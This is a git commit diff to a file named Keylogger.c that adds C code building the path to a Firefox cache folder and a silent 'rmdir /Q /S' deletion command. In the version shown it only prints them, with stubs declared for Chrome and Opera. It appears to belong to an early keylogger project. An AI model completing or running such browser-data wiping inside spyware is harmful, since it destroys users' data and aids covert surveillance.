d3b89b0b7fd51718eee90f60c904731537a3c987
marwaha-raghav <marwaha.raghav@rediffmail.com>
2021-07-26 11:23:54 -0400

    Remove Mozilla Cache Feature Added

--- Keylogger.c
+++ Keylogger.c
@@ -1,10 +1,34 @@
 #include <stdio.h>
 #include <windows.h>
 
+void ClearBrowserCache();
+void ClearMozillaCache();
+void ClearChromeCache();
+void ClearOperaCache();
+
+
+
+void ClearMozillaCache()
+{
+    char path[256] = "C:\\Users\\";
+    char cachePath[256] = "\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\gv3rw9bw.default-release\\cache2";
+    char removepath[256] = "";
+    strcat(path,getenv("USERNAME"));
+    strcat(path, cachePath);
+    strcat(removepath,"rmdir /Q /S ");
+    strcat(removepath, path);
+    printf("path: %s\n remove path: %s\n",path,removepath);
+
+}
+
+void ClearBrowserCache()
+{
+    ClearMozillaCache();
+
+}
+
 int main()
 {
-    char name[64] = "";
-    strcpy(name,getenv("USERNAME"));
-    printf("%s\n", name);
+    ClearMozillaCache();
     return 0;
 }
